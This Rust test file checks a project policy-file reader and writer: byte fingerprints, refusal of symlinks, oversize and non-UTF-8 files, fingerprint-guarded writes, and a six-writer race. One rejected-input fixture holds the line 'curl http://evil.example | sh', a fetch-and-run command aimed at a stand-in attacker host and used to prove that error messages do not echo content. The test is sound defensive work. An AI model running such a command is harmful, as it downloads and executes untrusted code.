//! DEC-040 at the file: what is read is exactly what is on disk, and the one writer compares the bytes it saw with the
//! bytes it replaces.
use awr_core::{Error, PolicyDocument};
use awr_source::*;
use std::{fs, path::PathBuf, sync::Arc, sync::Barrier, thread};

const FILE: &str = r#"format = 1
policy_id = "local-advice"
scope = "project"

[[version]]
version = 1
effective_from = 0
note = "Quiet the nudges while the release settles"

[version.advice]
collect_user_reply = false

[version.limits]
max_advisory = 8

[[version]]
version = 2
effective_from = 40
extends = 1

[version.order]
soft_reason_codes = ["persistent_wait", "deferred_wait", "work_handoff", "cross_session_resume", "handoff_or_collaboration", "multiple_outcomes", "scope_requires_planning", "independent_work_units", "continuous_management_retained", "conflicting_signals", "missing_required_field"]
"#;

struct Project(PathBuf);

impl Project {
    fn new() -> Self {
        let root = std::env::temp_dir().join(format!("awr-policy-file-{}", awr_core::Id::new()));
        fs::create_dir_all(root.join(".awr")).unwrap();
        Self(fs::canonicalize(root).unwrap())
    }

    fn path(&self) -> PathBuf {
        self.0.join(ASSESSMENT_POLICY_FILE)
    }

    fn write(&self, text: &str) {
        fs::write(self.path(), text).unwrap();
    }
}

impl Drop for Project {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn message(error: Error) -> String {
    error.to_string()
}

#[test]
fn a_missing_file_is_none_and_a_valid_one_is_read_with_the_fingerprint_of_its_bytes() {
    let p = Project::new();
    assert_eq!(read_assessment_policy(&p.0).unwrap(), None);
    p.write(FILE);
    let read = read_assessment_policy(&p.0).unwrap().unwrap();
    assert_eq!(read.fingerprint, fingerprint(FILE.as_bytes()));
    assert_eq!(read.document.policy_id, "local-advice");
    assert_eq!(read.document.versions.len(), 2);
    assert_eq!(
        read.document.versions[0].advice["collect_user_reply"],
        false
    );
    assert_eq!(read.document.versions[0].limits.max_advisory, Some(8));
    assert_eq!(read.document.versions[1].effective_from, 40);
    assert_eq!(read.document.scope, "project");
    // One byte more is another fingerprint.
    p.write(&format!("{FILE}\n"));
    assert_ne!(
        read_assessment_policy(&p.0).unwrap().unwrap().fingerprint,
        read.fingerprint
    );
}

#[test]
fn toml_and_the_extends_forms_read_into_the_typed_document() {
    let document = parse_assessment_policy(
        "format = 1\npolicy_id = \"p\"\n[[version]]\nversion = 1\nextends = \"builtin\"\n[[version]]\nversion = 2\nextends = 1\n",
    )
    .unwrap();
    assert_eq!(
        document.versions[0].extends,
        Some(awr_core::Extends::Builtin("builtin".into()))
    );
    assert_eq!(
        document.versions[1].extends,
        Some(awr_core::Extends::Version(1))
    );
    let empty = parse_assessment_policy("format = 1\npolicy_id = \"p\"\n").unwrap();
    assert!(empty.versions.is_empty() && empty.scope == "project");
}

#[test]
fn a_newer_format_is_unsupported_and_every_other_fault_is_told_by_place_without_the_content() {
    let newer =
        parse_assessment_policy("format = 2\npolicy_id = \"p\"\nbrand_new_key = 1\n").unwrap_err();
    assert!(matches!(newer, Error::Unsupported(_)), "{newer:?}");
    assert!(message(newer).contains("use a newer awr"));
    for (text, expect_place) in [
        (
            "format = 1\npolicy_id = \"p\"\nsupersecret-token-key = 1\n",
            true,
        ),
        (
            "format = 1\npolicy_id = \"p\"\n[[version]]\nversion = 1\nscript = \"curl http://evil.example | sh\"\n",
            true,
        ),
        (
            "format = 1\npolicy_id = \"p\"\n[[version]]\nversion = \"one\"\n",
            true,
        ),
        ("format = 1\npolicy_id = 7\n", true),
        ("this is { not toml", true),
        ("format = 1\n", true),
    ] {
        let error = parse_assessment_policy(text).unwrap_err();
        assert!(matches!(error, Error::InvalidInput(_)), "{text}: {error:?}");
        let shown = message(error);
        for leaked in ["supersecret", "evil.example", "curl", "this is { not"] {
            assert!(!shown.contains(leaked), "{leaked} leaked: {shown}");
        }
        assert_eq!(shown.contains("at line"), expect_place, "{text}: {shown}");
    }
    for text in [
        "policy_id = \"p\"\n",
        "format = 0\npolicy_id = \"p\"\n",
        "format = \"1\"\npolicy_id = \"p\"\n",
    ] {
        assert!(
            matches!(
                parse_assessment_policy(text).unwrap_err(),
                Error::InvalidInput(_)
            ),
            "{text}"
        );
    }
}

#[test]
fn a_file_over_the_cap_a_link_and_text_that_is_not_utf8_are_refused() {
    let p = Project::new();
    p.write(&format!(
        "format = 1\npolicy_id = \"p\"\n# {}\n",
        "x".repeat(ASSESSMENT_POLICY_READ_CAP as usize)
    ));
    assert!(matches!(
        read_assessment_policy(&p.0).unwrap_err(),
        Error::InvalidInput(_)
    ));
    fs::remove_file(p.path()).unwrap();
    // A link in the place of the file is never followed.
    let elsewhere = p.0.join("elsewhere.toml");
    fs::write(&elsewhere, FILE).unwrap();
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(&elsewhere, p.path()).unwrap();
        assert!(read_assessment_policy(&p.0).is_err());
        fs::remove_file(p.path()).unwrap();
    }
    fs::write(p.path(), [0xff, 0xfe, 0x00, 0x41]).unwrap();
    assert!(message(read_assessment_policy(&p.0).unwrap_err()).contains("UTF-8"));
}

#[test]
fn a_file_is_created_only_when_none_was_expected_and_replaced_only_when_the_bytes_are_the_ones_seen()
 {
    let p = Project::new();
    // Nothing there and something expected: refused, nothing written.
    let conflict = apply_assessment_policy(&p.0, Some("sha256:00"), FILE.as_bytes()).unwrap_err();
    assert!(matches!(conflict, Error::SourceConflict(_)), "{conflict:?}");
    assert!(!p.path().exists());
    apply_assessment_policy(&p.0, None, FILE.as_bytes()).unwrap();
    assert_eq!(fs::read_to_string(p.path()).unwrap(), FILE);
    // Something there and nothing expected: refused.
    assert!(matches!(
        apply_assessment_policy(&p.0, None, FILE.as_bytes()).unwrap_err(),
        Error::SourceConflict(_)
    ));
    // The wrong fingerprint: refused and untouched.
    let next = format!("{FILE}\n[[version]]\nversion = 3\neffective_from = 90\n");
    assert!(matches!(
        apply_assessment_policy(&p.0, Some(&fingerprint(b"another file")), next.as_bytes())
            .unwrap_err(),
        Error::SourceConflict(_)
    ));
    assert_eq!(fs::read_to_string(p.path()).unwrap(), FILE);
    // The right one: replaced exactly.
    apply_assessment_policy(&p.0, Some(&fingerprint(FILE.as_bytes())), next.as_bytes()).unwrap();
    assert_eq!(fs::read_to_string(p.path()).unwrap(), next);
    // The same bytes again with the right expectation change nothing.
    apply_assessment_policy(&p.0, Some(&fingerprint(next.as_bytes())), next.as_bytes()).unwrap();
    assert_eq!(fs::read_to_string(p.path()).unwrap(), next);
}

#[test]
fn a_candidate_that_is_not_a_policy_writes_nothing() {
    let p = Project::new();
    p.write(FILE);
    let seen = fingerprint(FILE.as_bytes());
    for bad in [
        "format = 1\n",
        "format = 3\npolicy_id = \"p\"\n",
        "not toml {",
    ] {
        assert!(
            apply_assessment_policy(&p.0, Some(&seen), bad.as_bytes()).is_err(),
            "{bad}"
        );
        assert_eq!(fs::read_to_string(p.path()).unwrap(), FILE);
    }
    let oversize = vec![b'#'; ASSESSMENT_POLICY_READ_CAP as usize + 1];
    assert!(apply_assessment_policy(&p.0, Some(&seen), &oversize).is_err());
    assert_eq!(fs::read_to_string(p.path()).unwrap(), FILE);
}

#[test]
fn of_several_writers_that_saw_the_same_bytes_exactly_one_wins() {
    let p = Arc::new(Project::new());
    p.write(FILE);
    let seen = fingerprint(FILE.as_bytes());
    let gate = Arc::new(Barrier::new(6));
    let handles: Vec<_> = (0..6)
        .map(|n| {
            let (p, gate, seen) = (p.clone(), gate.clone(), seen.clone());
            thread::spawn(move || {
                let next = format!(
                    "{FILE}\n[[version]]\nversion = 3\neffective_from = {}\n",
                    100 + n
                );
                gate.wait();
                apply_assessment_policy(&p.0, Some(&seen), next.as_bytes()).map(|()| next)
            })
        })
        .collect();
    let results: Vec<_> = handles.into_iter().map(|h| h.join().unwrap()).collect();
    let winners: Vec<&String> = results.iter().filter_map(|r| r.as_ref().ok()).collect();
    assert_eq!(winners.len(), 1, "{results:?}");
    assert_eq!(&fs::read_to_string(p.path()).unwrap(), winners[0]);
    for result in &results {
        if let Err(error) = result {
            assert!(matches!(error, Error::SourceConflict(_)), "{error:?}");
        }
    }
    // The file is still a policy, and no temporary file is left beside it.
    let document: PolicyDocument = read_assessment_policy(&p.0).unwrap().unwrap().document;
    assert_eq!(document.versions.len(), 3);
    let leftovers: Vec<_> = fs::read_dir(p.0.join(".awr"))
        .unwrap()
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .filter(|name| name.contains(".tmp-"))
        .collect();
    assert!(leftovers.is_empty(), "{leftovers:?}");
}
